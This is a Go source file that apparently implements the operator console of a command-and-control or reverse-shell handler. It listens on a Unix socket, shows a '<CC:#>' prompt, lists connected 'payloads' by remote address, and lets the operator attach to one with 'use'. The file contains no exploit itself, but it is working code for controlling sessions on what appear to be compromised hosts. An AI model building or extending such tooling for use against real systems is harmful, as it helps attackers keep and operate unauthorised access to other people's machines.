package server

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/gookit/color"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

type ControlServer struct {
	Sock string
}

func (c *ControlServer) Run(r *Runner) {
	l := c.listen()
	c.accept(l, r)
	//defer l.Close()
	//defer os.Remove(c.Addr)
}

func (c *ControlServer) listen() (net.Listener) {
	l, err := net.Listen("unix", c.Sock)

	if err != nil {
		log.Printf("[UNIX] Listen on %s: %v\n", c.Sock, err)
		os.Exit(1)
	}

	log.Printf("[UNIX] Listening on %s\n", c.Sock)

	return l
}

func (c *ControlServer) accept(l net.Listener, r *Runner) {
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Printf("[UNIX] Accept control socket: %v\n", err)
			continue
		}

		log.Println("Accepted control socket", c.Sock)

		go c.handle(conn, r)
	}
}

func (c *ControlServer) handle(conn net.Conn, r *Runner) {
	reader := bufio.NewReader(conn)
	defer conn.Close()

	for {
		text := color.Green.Text("<CC:#> ")
		conn.Write([]byte(text))

		text, err := reader.ReadString('\n')

		if err == io.EOF {
			break
		}

		if err != nil {
			log.Println("[UNIX] Reading unix input", err)
			continue
		}

		text = strings.TrimSpace(text)
		cont := strings.Split(text, " ")

		switch {
		case cont[0] == "show":
			var buffer bytes.Buffer

			for i, p := range r.Payloads {
				s := fmt.Sprintf("ID: %d Address: %s\n", i, p.Addr.String())
				buffer.WriteString(s)
			}

			conn.Write(buffer.Bytes())

		case cont[0] == "use":
			if len(cont) < 2 {
				continue
			}

			p, err := r.getPayload(strings.TrimSpace(cont[1]))
			if err != nil {
				s := fmt.Sprintf("Getting payload %s\n", err)
				conn.Write([]byte(s))
				continue
			}

			p.Activate(conn)
		case text == "exit":
			conn.Write([]byte("Bye 😈\n"))
			return
		default:
			conn.Write([]byte("Unknown command use help to see command list\n"))
		}
	}
}
